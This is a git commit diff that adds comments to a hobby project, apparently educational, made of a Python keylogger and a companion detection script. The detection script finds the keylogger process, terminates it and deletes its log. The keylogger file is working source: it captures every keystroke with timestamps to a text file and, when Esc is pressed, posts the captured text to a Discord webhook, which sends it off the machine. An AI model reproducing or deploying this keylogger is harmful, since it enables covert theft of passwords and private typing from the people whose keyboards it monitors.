0849b02e2062e5e77174e676d15b65658c4b4b3f
Kieran Pritchard <KieranPritchard06@gmail.com>
2025-12-14 11:59:07 +0000

    added more commments

--- detection_script.py
+++ detection_script.py
@@ -7,55 +7,78 @@ def detect_script(keylogger_file):
     for proc in psutil.process_iter(["pid", "name", "username", "cmdline"]):
         # This tries to get the cmdline command to compare it to the file to see if the command matchs to the file
         try:
+            # The process info for cmdline
             cmdline = proc.info.get("cmdline")
+            # checks if the path of cmdline and the keylogger appear in each other
             if cmdline and os.path.basename(keylogger_file) in cmdline[-1]:
                 # this returns if the script was found and the process
                 print("[+] Script was found.")
+                # Returns true and the process
                 return True, proc
         except Exception as e:
+            # Outputs error message
             print(f"error encountered: {e}")
     # Outputs the result if the script is not found
     print("[-] Script not found.")
+    # Returns false and none
     return False, None
 
 # This detects if there is a text log by checking if the text file is at the path
 def detect_text_log(text_log):
+    # Checks if the text log exists
     file_exists = os.path.exists(text_log)
 
+    # Checks the log exists
     if file_exists:
+        # Outputs the log was found
         print("[+] Log was found")
+        # Returns true
         return True
     else:
+        # Outputs it does not found
         print("[-] Log was not found")
+        # Returns fault
         return False
 
 # This terminates the scripts
 def terminate_script(proc):
+    # Terminates the process
     proc.terminate()
+    # Outputs that it is terminated
     print("[+] Process Terminated")
 
 # This deletes the script
 def delete_log(text_log):
+    # Removes the files
     os.remove(text_log)
+    # Outputs that the log was deleted
     print("[+] Log was deleted.")
 
 # This is the main logic of the program that triggers the forementioned functions
 def main():
-    keylogger_file = "Python/Projects/Keylogger-and-Detection-Script/keylogger.py"
+    # Stores the keylogger file and log paths
+    keylogger_file = "./Keylogger-and-Detection-Script/keylogger.py"
     text_log = "./key_presses.txt"
 
+    # Outputs the header of the script
     print("=" * 60)
     print("Keylogger Detection Script")
     print("=" * 60)
 
+    # Gets the result and keylogger process from the detect script function
     script_detection_result, keylogger_process = detect_script(keylogger_file)
+    # Gets the log detection result from the function
     log_detection_result = detect_text_log(text_log)
 
+    # checks if both the script and log are detected
     if script_detection_result == True and log_detection_result == True:
+        # Terminates the script and deletes the logs
         terminate_script(keylogger_process)
         delete_log(text_log)
+    # deletes the log if the script isnt detected
     elif log_detection_result == True and script_detection_result == False:
         delete_log(text_log)
 
+# Starts the program
 if __name__ == "__main__":
     main()
--- keylogger.py
+++ keylogger.py
@@ -10,46 +10,69 @@ keys_pressed = ""
 
 # this loads and sends the logs to discord
 def send_log_to_discord():
+    # Loads the .env file from the repository
     load_dotenv()
+    # Loads the webhook from the .env file
     webhook = os.getenv("WEBHOOK_URL")
 
+    # opens the log and reads the content
     with open(log_file, "r") as f:
+        # stores the content in the content variable
         content = f.read()
 
+    # Check to ensure the content doesnt go over discords boundarys
     if len(content) > 1900:
+        # gets the last amount of characters that discord can handle
         content = content[-1900:]
 
+    # Stotes the content in a dictionary to be turned into json
     data = {"content": f"Log update:\n{content}"}
+    # Sends the data via a http post to the webhook
     response = requests.post(webhook, json=data)
     
+    # Checks if the status code is successfully
     if response.status_code == 204:
+        # Outputs success message
         print("Log sent to Discord successfully!")
     else:
+        # outputs error message and status code
         print(f"Failed to send log. Status code: {response.status_code}")
 
 # Records key presses
 def on_press(key):
+    # Turns keys pressed into a global variable
     global keys_pressed
+    # Trys to add keys pressed to keys char
     try:
+        # adds key to keys pressed
         keys_pressed += key.char  # regular key
+        # Prints the key pressed
         print(f"Key {key.char} pressed")
     except AttributeError:
+        # adds key to keys pressed
         keys_pressed += f"[{key}]"  # special key
+        # Prints the key pressed
         print(f"Special key {key} pressed")
 
 # Records released keys
 def on_release(key):
+    # Turns keys pressed into a global variable
     global keys_pressed
     
     # Only write if something was typed
     if keys_pressed:
+        # Opens the log file with append permissions
         with open(log_file, "a") as f:
+            # Writes the key pressed to the log
             f.write(f"{keys_pressed} at {datetime.datetime.now()}\n")
         keys_pressed = ""  # reset after writing
-    
+    # Checks if the key is esc
     if key == keyboard.Key.esc:
+        # Outputs exiting keylogger
         print("Exiting keylogger...")
+        # sends the log to discord
         send_log_to_discord()
+        # retuns false 
         return False
 
 # Keyboard listener
